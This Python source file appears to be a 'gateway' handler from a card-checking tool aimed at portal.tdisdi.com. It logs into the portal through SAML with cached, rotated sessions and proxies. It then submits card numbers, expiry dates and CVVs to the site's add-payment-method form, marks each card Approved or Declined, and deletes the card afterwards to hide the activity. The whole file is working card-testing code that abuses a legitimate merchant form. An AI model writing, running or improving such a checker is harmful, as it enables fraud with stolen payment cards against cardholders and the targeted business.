"""
Tdisdi Auth handler — portal.tdisdi.com saved-payment-method authorization check.

Fully autonomous via cookies only (no static API tokens):
  1. GET /profile with gateway cookies -> extract `user_uuid` (entity_uuid)
     and `csrf-token` from HTML.
  2. POST /ajax/add_payment_method_form (form-encoded card data).
  3. success=true "Payment Method Added" -> APPROVED.
     success=false -> DECLINED with gateway message.
  4. Best-effort cleanup: view saved methods, delete the added card by token
     so the account stays clean for the next check.

GitHub variables (login-only like other with_login gateways):
  - login: {"set_N": {"email": .., "password": ..}} — required, auto-renews
    the SAML session on every run when cookies are absent/expired.
  - cookies: optional fast-path {"set_N": [{...}]}. When present and valid
    they are used directly; otherwise the handler logs in automatically.
  - entity_uuid: optional override when auto-extract must be skipped
  - base_url: default https://portal.tdisdi.com
"""

import logging
import re
import threading
import time
from datetime import datetime, timedelta
from typing import Any, Dict, Optional, Tuple

import requests

from core.session import REQUEST_TIMEOUT, _build_api_session, _apply_cookies
from core.proxy import _proxy_dict, is_proxy_error, categorize_proxy_error

logger = logging.getLogger(__name__)

APPROVED = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅"
DECLINED = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌"
ERROR = "𝙀𝙍𝙍𝙊𝙍 ⚠️"
FAILED = "𝙁𝘼𝙄𝙇𝙀𝘿 ❌"

BASE_URL = "https://portal.tdisdi.com"

_MOBILE_UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36"
)

_RE_UUID = re.compile(r'id="user_uuid" value="([0-9a-fA-F-]{36})"')
_RE_CSRF_META = re.compile(r'name="csrf-token" content="([^"]+)"')
_RE_TOKEN_INPUT = re.compile(r'name="_token" value="([^"]+)"')


def _card_type(number: str) -> str:
    n = (number or "").strip()
    if n.startswith("4"):
        return "visa"
    if n.startswith("5"):
        return "mastercard"
    if n.startswith(("34", "37")):
        return "amex"
    if n.startswith("6"):
        return "discover"
    return "visa"


def _extract_profile_vars(html: str) -> Tuple[Optional[str], Optional[str]]:
    """Return (entity_uuid, csrf_token) from /profile HTML."""
    uuid = None
    m = _RE_UUID.search(html or "")
    if m:
        uuid = m.group(1)
    csrf = None
    m = _RE_CSRF_META.search(html or "")
    if m:
        csrf = m.group(1)
    else:
        m = _RE_TOKEN_INPUT.search(html or "")
        if m:
            csrf = m.group(1)
    return uuid, csrf


def _session_expired(html: str) -> bool:
    t = (html or "").lower()
    return ("login" in t and "password" in t and "user_uuid" not in t) or "saml" in t and "user_uuid" not in t


def _is_saml_redirect(resp) -> bool:
    """True when the portal bounced us to the SAML IdP login (dead session).

    Live behavior 2026-09-26: GET /profile -> 302 /sso-login -> 302
    federation.tdisdi.com/.../SSOService.php. HTML sniffing alone is not
    enough, so check the redirect chain and final URL too.
    """
    try:
        urls = [h.url for h in (resp.history or [])] + [resp.url]
        return any("federation.tdisdi.com" in (u or "") or "sso-login" in (u or "") for u in urls)
    except Exception:
        return False


def _cleanup_added_card(session: requests.Session, base: str, uuid: str,
                        csrf: Optional[str], last_four: str) -> None:
    """Best-effort delete of the card just added. Never raises."""
    try:
        headers = {"X-Requested-With": "XMLHttpRequest", "Accept": "*/*"}
        if csrf:
            headers["X-CSRF-TOKEN"] = csrf
        r = session.get(
            f"{base}/ajax/view_payment_method_detail",
            params={"entity_uuid": uuid, "entity_type": 3},
            headers=headers, timeout=REQUEST_TIMEOUT,
        )
        try:
            items = (r.json().get("data") or [])
        except ValueError:
            return
        token = None
        for it in items:
            if isinstance(it, dict) and str(it.get("lastFour", "")) == str(last_four):
                token = it.get("token")
                break
        if not token and items and len(items) == 1 and isinstance(items[0], dict):
            token = items[0].get("token")
        if not token:
            return
        session.get(
            f"{base}/ajax/delete_payment_method_form",
            params={"entity_uuid": uuid, "entity_type": 3, "token": token},
            headers=headers, timeout=REQUEST_TIMEOUT,
        )
    except Exception as exc:
        logger.debug(f"Tdisdi cleanup skipped: {exc}")


_RE_LOGIN_URL = re.compile(
    r'(https://federation\.tdisdi\.com/module\.php/core/loginuserpass\?AuthState=[^"\'\s<>]+)'
)
_RE_SAML_RESPONSE = re.compile(r'name="SAMLResponse" value="([^"]+)"')


# ── Login session rotation (same pattern as Stripe v3_with_login) ──
# One SAML login mints portal cookies reused while alive, so the server only
# logs in again when the cached session dies — not on every request.
# Portal sessions live ~1.5h, so the TTL matches that (stale entries are
# dropped instead of being revalidated pointlessly).
_LOGIN_CACHE_TTL = timedelta(minutes=80)
_login_cache: Dict[str, Dict[str, Any]] = {}
_login_cache_lock = threading.Lock()
_login_lock = threading.Lock()


def _get_cached_login(login_email: str) -> Optional[Dict[str, str]]:
    with _login_cache_lock:
        entry = _login_cache.get(login_email)
        if not entry:
            return None
        if datetime.now() - entry["ts"] > _LOGIN_CACHE_TTL:
            _login_cache.pop(login_email, None)
            logger.info(f"Tdisdi login cache expired for {login_email}")
            return None
        logger.info(f"Tdisdi login cache hit for {login_email}")
        return entry["cookies"]


def _set_cached_login(login_email: str, cookies: Dict[str, str]) -> None:
    with _login_cache_lock:
        _login_cache[login_email] = {"cookies": cookies, "ts": datetime.now()}
    logger.info(f"Tdisdi login session cached for {login_email}")


def _invalidate_cached_login(login_email: str) -> None:
    with _login_cache_lock:
        _login_cache.pop(login_email, None)
    logger.info(f"Tdisdi login cache invalidated for {login_email}")


def _renew_session_via_login(session: requests.Session, login: Dict) -> Tuple[bool, str]:
    """SAML re-login using map credentials. Returns (ok, error).

    Flow (proven live 2026-09-26): profile redirects land on the IdP
    loginuserpass form -> POST username/password -> SAMLResponse form ->
    POST portal /saml/acs -> fresh session cookies in jar. No captcha
    token required. Single attempt; failures must surface clearly so the
    user knows to update the password, never silent-loop.
    """
    email = (login or {}).get("email", "")
    password = (login or {}).get("password", "")
    if not email or not password:
        return False, "login credentials missing in gateway config"
    try:
        r = session.get(f"{BASE_URL}/profile", timeout=REQUEST_TIMEOUT, allow_redirects=True)
        m = _RE_LOGIN_URL.search(r.text or "")
        if not m:
            # Maybe already logged in (cookies refreshed by the GET itself)
            uuid, _ = _extract_profile_vars(r.text or "")
            if uuid:
                return True, ""
            # IdP answers loop_detection/Retry-Login when we hit it too fast
            # (parallel renewals, bursts). Back off once, then look again.
            low = (r.text or "").lower()
            if "loop_detection" in low or "ratelimit" in low or "retry login" in low:
                logger.warning("Tdisdi IdP rate-limited, backing off 45s before retry")
                time.sleep(45)
                r = session.get(f"{BASE_URL}/profile", timeout=REQUEST_TIMEOUT, allow_redirects=True)
                m = _RE_LOGIN_URL.search(r.text or "")
                if not m:
                    uuid, _ = _extract_profile_vars(r.text or "")
                    return (True, "") if uuid else (False, "IdP rate-limited, retry in a few minutes")
            else:
                return False, "login form not found (IdP changed?)"
        login_url = m.group(1).replace("&amp;", "&")
        resp = session.post(
            login_url,
            data={"username": email, "password": password, "country_code": "DZ"},
            headers={"Referer": login_url, "Origin": "https://federation.tdisdi.com"},
            timeout=REQUEST_TIMEOUT,
        )
        m2 = _RE_SAML_RESPONSE.search(resp.text or "")
        if not m2:
            low = (resp.text or "").lower()
            if "turnstile" in low or "captcha" in low:
                return False, "login blocked by captcha, update cookies manually"
            return False, "login failed (wrong email/password?)"
        acs = session.post(
            f"{BASE_URL}/saml/acs",
            data={"SAMLResponse": m2.group(1)},
            headers={"Referer": "https://federation.tdisdi.com/", "Origin": "https://federation.tdisdi.com"},
            timeout=REQUEST_TIMEOUT,
        )
        if acs.status_code >= 400:
            return False, f"login ACS rejected (HTTP {acs.status_code})"
        return True, ""
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            return False, categorize_proxy_error(exc)
        return False, f"Request failed: {exc}"


def handle_tdisdi_auth(card_info: Dict, person: Dict, gateway_config: Dict) -> Tuple[str, str]:
    """Main entry point. Version must contain v5_with_login (login-only)."""
    version = gateway_config.get("version", "")
    if "v5_with_login" not in version:
        return ERROR, f"Unsupported Tdisdi version: {version}"

    for f in ("url",):
        if f not in gateway_config:
            return ERROR, f"{f} is missing in gateway config"

    base = (gateway_config.get("base_url") or BASE_URL).rstrip("/")
    proxies = _proxy_dict(gateway_config)
    session = _build_api_session(proxies)
    try:
        session.headers.update({
            "User-Agent": _MOBILE_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": base,
            "Referer": f"{base}/profile",
        })
        _apply_cookies(session, gateway_config)

        # Login session rotation: reuse cached SAML cookies when valid, so a
        # fresh IdP login happens only when the session actually dies.
        login_cfg = gateway_config.get("login")
        login_email = (login_cfg or {}).get("email", "") if isinstance(login_cfg, dict) else ""
        if login_email:
            cached = _get_cached_login(login_email)
            if cached:
                for _n, _v in cached.items():
                    session.cookies.set(_n, _v)

        # 1) Profile -> uuid + csrf (autonomous, no GitHub tokens needed).
        # Retry once: the portal sometimes refreshes session cookies via
        # Set-Cookie on the first hit before serving the profile.
        pr, html = None, ""
        for attempt in range(2):
            try:
                pr = session.get(f"{base}/profile", timeout=REQUEST_TIMEOUT, allow_redirects=True)
            except requests.RequestException as exc:
                is_pe, _ = is_proxy_error(exc)
                if is_pe:
                    return ERROR, categorize_proxy_error(exc)
                return ERROR, f"Request failed: {exc}"
            html = pr.text or ""
            if not _is_saml_redirect(pr):
                break
        auto_uuid, csrf = _extract_profile_vars(html)
        uuid = gateway_config.get("entity_uuid") or auto_uuid
        if uuid:
            if login_email:
                # Session proven alive — rotate it into the cache.
                _set_cached_login(login_email, {c.name: c.value for c in session.cookies})
        if not uuid:
            expired = _is_saml_redirect(pr) or _session_expired(html) or pr.status_code in (401, 403)
            login = gateway_config.get("login")
            if expired and isinstance(login, dict) and login.get("email") and login.get("password"):
                # Serialize fresh logins: the IdP rate-limits parallel attempts.
                with _login_lock:
                    # Another thread may have renewed while we waited.
                    recheck = _get_cached_login(login["email"])
                    if recheck:
                        for _n, _v in recheck.items():
                            session.cookies.set(_n, _v)
                        pr = session.get(f"{base}/profile", timeout=REQUEST_TIMEOUT, allow_redirects=True)
                        html = pr.text or ""
                        auto_uuid, csrf = _extract_profile_vars(html)
                        uuid = gateway_config.get("entity_uuid") or auto_uuid
                    if not uuid:
                        _invalidate_cached_login(login["email"])
                        ok, err = _renew_session_via_login(session, login)
                        if not ok:
                            return ERROR, f"Session expired and auto-login failed ({err})"
                        _set_cached_login(login["email"], {c.name: c.value for c in session.cookies})
                        # Post-renew fetch gets one retry: a single network
                        # blip here must not fail the whole check.
                        pr, html = None, ""
                        for _retry in range(2):
                            try:
                                pr = session.get(f"{base}/profile", timeout=REQUEST_TIMEOUT, allow_redirects=True)
                                html = pr.text or ""
                                break
                            except requests.RequestException as exc:
                                is_pe, _ = is_proxy_error(exc)
                                if is_pe:
                                    return ERROR, categorize_proxy_error(exc)
                                if _retry == 0:
                                    continue
                                return ERROR, f"Request failed: {exc}"
                        auto_uuid, csrf = _extract_profile_vars(html)
                        uuid = gateway_config.get("entity_uuid") or auto_uuid
            if not uuid:
                if _is_saml_redirect(pr) or _session_expired(html) or pr.status_code in (401, 403):
                    return ERROR, "Session expired, update cookies in GitHub (portal.tdisdi.com)"
                return ERROR, "Failed to extract session (user_uuid) from profile"
        if not csrf:
            csrf = gateway_config.get("csrf_token", "")

        # 2) Add payment method
        number = "".join(ch for ch in str(card_info.get("number", "")) if ch.isdigit())
        month = str(card_info.get("month", "")).zfill(2)
        year = str(card_info.get("year", ""))
        if len(year) == 2:
            year = "20" + year
        holder = f"{person.get('first_name', 'Test')} {person.get('last_name', 'User')}"
        form = {
            "entity_uuid": uuid,
            "entity_type": 3,
            "card_holder_name": holder,
            "card_number": number,
            "card_type": _card_type(number),
            "expirationMonth": month,
            "expirationYear": year,
            "cvv": str(card_info.get("cvv", "")),
        }
        ajax_headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": base,
            "Referer": f"{base}/profile",
            "Accept": "*/*",
        }
        if csrf:
            ajax_headers["X-CSRF-TOKEN"] = csrf
        try:
            resp = session.post(
                f"{base}/ajax/add_payment_method_form",
                data=form, headers=ajax_headers, timeout=REQUEST_TIMEOUT,
            )
        except requests.RequestException as exc:
            is_pe, _ = is_proxy_error(exc)
            if is_pe:
                return ERROR, categorize_proxy_error(exc)
            return ERROR, f"Request failed: {exc}"

        try:
            data = resp.json()
        except ValueError:
            if resp.status_code in (401, 403, 419):
                return ERROR, "Session expired, update cookies in GitHub (portal.tdisdi.com)"
            return ERROR, f"Unexpected response (HTTP {resp.status_code})"

        msg = str(data.get("message", "")).strip() or "No response details"
        if data.get("success") is True:
            _cleanup_added_card(session, base, uuid, csrf, number[-4:])
            return APPROVED, "Approved"
        return DECLINED, msg
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            return ERROR, categorize_proxy_error(exc)
        return ERROR, f"Request failed: {exc}"
    except Exception as exc:
        logger.error(f"Unexpected error in handle_tdisdi_auth: {exc}")
        return ERROR, f"Processing failed: {exc}"
    finally:
        try:
            session.close()
        except Exception:
            pass
